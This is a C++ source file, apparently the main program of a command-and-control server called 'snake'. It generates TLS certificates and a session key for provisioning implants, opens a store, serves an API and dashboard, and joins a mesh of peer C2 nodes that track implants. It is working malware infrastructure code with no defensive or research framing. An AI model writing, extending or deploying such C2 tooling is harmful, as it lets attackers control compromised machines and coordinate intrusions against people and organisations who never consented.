#include <sys/stat.h>
#include <sys/types.h>

#include <cerrno>
#include <csignal>
#include <cstdio>
#include <cstring>
#include <memory>
#include <string>
#include <vector>

#include "snake/api.hpp"
#include "snake/c2.hpp"
#include "snake/cert.hpp"
#include "snake/crypto.hpp"
#include "snake/mesh.hpp"
#include "snake/store.hpp"

namespace {

void mkdir_parent(const std::string& path, mode_t mode) {
    size_t slash = path.find_last_of('/');
    std::string dir = slash == std::string::npos ? "." : (slash == 0 ? "/" : path.substr(0, slash));
    if (dir == "." || dir == "/") return;
    std::string built;
    size_t pos = 0;
    while (pos <= dir.size()) {
        size_t next = dir.find('/', pos);
        std::string part = dir.substr(0, next == std::string::npos ? std::string::npos : next);
        pos = next == std::string::npos ? dir.size() + 1 : next + 1;
        if (part.empty() || part == ".") continue;
        built = part;
        ::mkdir(built.c_str(), mode);
    }
}

}  // namespace

int main(int argc, char** argv) { return snake::c2::c2_main(argc, argv); }

namespace snake::c2 {

int c2_main(int argc, char** argv) {
    std::signal(SIGPIPE, SIG_IGN);
    Config cfg;
    std::vector<std::string> args(argv + 1, argv + argc);
    bool help = false;
    std::string err;
    if (!parse_args(args, cfg, help, err)) {
        std::fprintf(stderr, "%s\n", err.c_str());
        std::fprintf(stderr, "%s", usage().c_str());
        return 2;
    }
    if (help) {
        std::fprintf(stdout, "%s", usage().c_str());
        return 0;
    }

    std::string node_id = cfg.node_id.empty() ? random_node_id() : cfg.node_id;

    mkdir_parent(cfg.db_path, 0700);

    if (cfg.gen_certs || cfg.gen_certs_only) {
        cert::SelfSignedFiles files;
        if (!cert::ensure_self_signed(node_id, cfg.cert_sans, cfg.force_certs, "certs", &files,
                                      &err)) {
            std::fprintf(stderr, "cert generation: %s\n", err.c_str());
            return 1;
        }
        cfg.tls_cert = files.cert_file;
        cfg.tls_key = files.key_file;
        if (files.generated) {
            log_line("generated self-signed cert: " + files.cert_file + " / " + files.key_file);
        } else {
            log_line("reusing existing certs: " + files.cert_file + " / " + files.key_file +
                     " (use --force-certs to regenerate)");
        }
        if (cfg.gen_certs_only) {
            std::printf("certs ready: %s / %s\n", files.cert_file.c_str(), files.key_file.c_str());
            return 0;
        }
    }

    store::Store st;
    if (!st.open(cfg.db_path, &err)) {
        std::fprintf(stderr, "db: %s\n", err.c_str());
        return 1;
    }

    Bytes session_key;
    if (!cfg.key_hex.empty()) {
        if (!decode_session_key(cfg.key_hex, &session_key, &err)) {
            std::fprintf(stderr, "%s\n", err.c_str());
            return 1;
        }
    } else {
        session_key = random_bytes(32);
        log_line("generated session key (provision implants with -key): " + to_hex(session_key));
    }

    bool tls_enabled = !cfg.tls_cert.empty() && !cfg.tls_key.empty();

    api::Config api_cfg;
    api_cfg.listen = cfg.listen;
    api_cfg.c2_id = node_id;
    api_cfg.session_key = session_key;
    api_cfg.tls_enabled = tls_enabled;
    api_cfg.tls_cert = cfg.tls_cert;
    api_cfg.tls_key = cfg.tls_key;
    api_cfg.store = &st;
    api_cfg.dashboard_pw = cfg.password;

    api::Server srv(std::move(api_cfg));

    std::unique_ptr<mesh::Node> mesh_node;
    if (!cfg.mesh.empty()) {
        mesh::Config mcfg;
        mcfg.node_id = node_id;
        mcfg.listen_addr = cfg.mesh;
        if (!cfg.bootstrap.empty()) {
            size_t start = 0;
            while (start <= cfg.bootstrap.size()) {
                size_t comma = cfg.bootstrap.find(',', start);
                if (comma == std::string::npos) {
                    mcfg.bootstrap.push_back(cfg.bootstrap.substr(start));
                    break;
                }
                mcfg.bootstrap.push_back(cfg.bootstrap.substr(start, comma - start));
                start = comma + 1;
            }
        }
        if (!mesh::generate_mesh_cert(node_id, &mcfg.tls, &err)) {
            std::fprintf(stderr, "mesh cert: %s\n", err.c_str());
            return 1;
        }
        mcfg.on_heartbeat = [](const gob::Heartbeat& hb) {
            log_line("[mesh] heartbeat from " + truncate(hb.node_id, 8));
        };
        mcfg.on_peer_join = [&st](const mesh::PeerInfo& info) {
            log_line("[mesh] peer joined: " + truncate(info.id, 8) + " @ " + info.addr);
            store::MeshNode n;
            n.id = info.id;
            n.addr = info.addr;
            n.implants = info.implants;
            n.version = info.version;
            std::string e;
            st.upsert_mesh_node(n, &e);
        };
        mcfg.on_peer_leave = [](const std::string& id) {
            log_line("[mesh] peer left: " + truncate(id, 8));
        };
        mesh_node = std::make_unique<mesh::Node>(std::move(mcfg));
        if (!mesh_node->start(&err)) {
            std::fprintf(stderr, "mesh: %s\n", err.c_str());
            return 1;
        }
        log_line("mesh node active on " + cfg.mesh);
    }

    std::fprintf(stdout, "%s", banner(cfg, node_id, session_key, tls_enabled).c_str());
    std::fflush(stdout);

    if (!srv.start(&err)) {
        std::fprintf(stderr, "server: %s\n", err.c_str());
        return 1;
    }
    if (tls_enabled) {
        log_line("starting TLS on " + cfg.listen);
    } else {
        log_line("starting (plain HTTP) on " + cfg.listen);
    }

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGINT);
    sigaddset(&set, SIGTERM);
    pthread_sigmask(SIG_BLOCK, &set, nullptr);
    int sig = 0;
    sigwait(&set, &sig);
    if (mesh_node) mesh_node->stop();
    srv.stop();
    return 0;
}

}  // namespace snake::c2
